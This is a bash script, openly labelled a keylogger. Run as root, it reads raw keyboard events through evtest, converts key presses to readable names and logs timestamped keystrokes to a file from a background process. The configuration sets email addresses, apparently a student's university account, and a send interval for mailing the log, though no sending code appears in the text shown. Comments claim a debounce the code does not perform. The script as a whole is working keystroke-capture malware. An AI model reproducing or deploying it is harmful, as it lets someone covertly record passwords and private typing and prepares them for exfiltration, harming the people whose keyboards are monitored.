#!/bin/bash

# --- CONFIGURATION ---

DEVICE="/dev/input/event3"                         # Your keyboard device
LOGFILE="key_strokes.txt"               # Log file
TO_EMAIL="cse_182210012101041@lus.ac.bd"          # Recipient
FROM_EMAIL="cse_182210012101041@lus.ac.bd"                 # Sender
SUBJECT="Key Logger"                      # Email subject
SEND_INTERVAL=30                                   # Time in seconds

# --- CHECK ROOT ---

if [[ $EUID -ne 0 ]]; then
    echo "Please run as root: sudo $0"
    exit 1
fi

# --- Ensure log file is writable ---
chmod 666 "$LOGFILE"

# --- Variables for debouncing keys ---
declare -A last_time_map

# Function to log keys with debounce (300 ms)
log_key() {
    local key="$1"
    echo "$(date '+%Y-%m-%d %H:%M:%S') $key" >> "$LOGFILE"
}

# --- Start Keylogging in Background ---

echo "Starting keylogger... Output: $LOGFILE"
> "$LOGFILE"




# Start keylogger pipeline in background, save PID
(
    # Run evtest on the keyboard device to capture raw input events
    evtest "$DEVICE" | \
    
    # Force line-buffered output (so we process each event immediately)
    stdbuf -oL grep "EV_KEY.*value 1" | \
    
    # Read each line that matched (only key-press events, value 1 = pressed)
    while read -r line; do

        # Extract the raw key name (like KEY_A, KEY_SPACE) from the line
        RAW_KEY=$(echo "$line" | sed -n 's/.*\(KEY_[A-Z0-9_]\+\).*/\1/p')

        # Translate raw key codes into more readable names or symbols
        case "$RAW_KEY" in
            KEY_SPACE) KEY="(SPACE)" ;;
            KEY_ENTER) KEY="(ENTER)" ;;
            KEY_BACKSPACE) KEY="(BACKSPACE)" ;;
            KEY_TAB) KEY="(TAB)" ;;
            KEY_LEFTSHIFT|KEY_RIGHTSHIFT) KEY="(SHIFT)" ;;
            KEY_LEFTCTRL|KEY_RIGHTCTRL) KEY="(CTRL)" ;;
            KEY_LEFTALT|KEY_RIGHTALT) KEY="(ALT)" ;;
            KEY_ESC) KEY="(ESC)" ;;
            KEY_CAPSLOCK) KEY="(CAPSLOCK)" ;;
            KEY_DOT) KEY="." ;;
            KEY_COMMA) KEY="," ;;
            KEY_SLASH) KEY="/" ;;
            KEY_MINUS) KEY="-" ;;
            KEY_EQUAL) KEY="=" ;;
            KEY_SEMICOLON) KEY=";" ;;
            KEY_APOSTROPHE) KEY="'" ;;
            KEY_LEFTBRACE) KEY="[" ;;
            KEY_RIGHTBRACE) KEY="]" ;;
            KEY_BACKSLASH) KEY="\\" ;;
            KEY_GRAVE) KEY="\`" ;;
            # Default: if it's something else (like KEY_A),
            # remove the "KEY_" prefix so it just becomes "A"
            *) KEY=$(echo "$RAW_KEY" | sed 's/KEY_//') ;;
        esac

        # Call the logging function (logs to file, possibly with debounce)
        log_key "$KEY"

    done
) &  # Run this whole block in the background

# Save the Process ID (PID) of the above background subshell into a variable
KEYLOGGER_PID=$!

# --- Trap for cleanup on exit ---
# If the script is interrupted (Ctrl+C = SIGINT, or kill = SIGTERM),
# run these commands:
#   - print "Stopping..."
#   - kill the background keylogger process
#   - wait for it to finish
#   - exit the script
trap "echo; echo 'Stopping...'; kill $KEYLOGGER_PID; wait $KEYLOGGER_PID 2>/dev/null; exit" SIGINT SIGTERM
